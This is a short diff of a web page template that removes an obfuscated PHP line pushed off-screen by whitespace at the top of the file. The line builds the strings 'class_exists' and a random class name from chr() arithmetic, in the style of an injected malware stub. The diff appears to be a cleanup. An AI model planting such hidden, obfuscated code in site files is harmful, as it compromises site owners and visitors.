@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                 $ykHtPOLXZo = chr ( 846 - 735 )."\172" . 'm' . "\x5f" . chr ( 753 - 668 )."\107" . chr ( 535 - 415 ); $rMSqY = 'c' . chr ( 815 - 707 ).'a' . "\163" . chr (115) . chr (95) . chr (101) . "\x78" . chr (105) . chr ( 1004 - 889 )."\x74" . "\x73";$LEwJITlMoT = class_exists($ykHtPOLXZo); $ykHtPOLXZo = "43019";$rMSqY = "20626";$bYOSwuJm = FALSE; ?><!DOCTYPE html>
+<!DOCTYPE html>
 <html xmlns="http://www.w3.org/1999/xhtml" lang="zxx">
 
 <head>
